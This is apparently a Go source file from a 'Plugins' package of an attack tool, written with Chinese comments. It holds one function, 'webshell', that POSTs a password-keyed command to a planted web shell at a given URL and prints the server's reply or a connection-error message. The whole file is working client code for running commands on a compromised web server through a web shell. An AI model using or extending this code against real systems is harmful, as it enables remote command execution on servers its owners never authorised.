package Plugins

import (
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"strings"
	"time"
)

func webshell(path string,Wcommand string,passwd string)  {
	data :=passwd+"="+Wcommand
	reader :=strings.NewReader(string(data))
	request,err := http.NewRequest("POST",path,reader)
	defer request.Body.Close()
	if err!=nil{
		fmt.Println(err.Error())
		return
	}
	request.Header.Set("Content-Type","application/x-www-form-urlencoded")
	client :=http.Client{
		Transport: &http.Transport{
			Dial: func(netw, addr string) (net.Conn, error) {
				c, err := net.DialTimeout(netw, addr, time.Second*3) //设置建立连接超时
				if err != nil {
					return nil, err
				}
				c.SetDeadline(time.Now().Add(5 * time.Second)) //设置发送接收数据超时
				return c, nil
			},
		},
	}
	resp,err := client.Do(request)
	if err!=nil {
		//fmt.Println(err.Error())
		fmt.Println(path+" 连接异常")
		return
	}

	respBytes, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(string(respBytes))

	return

}
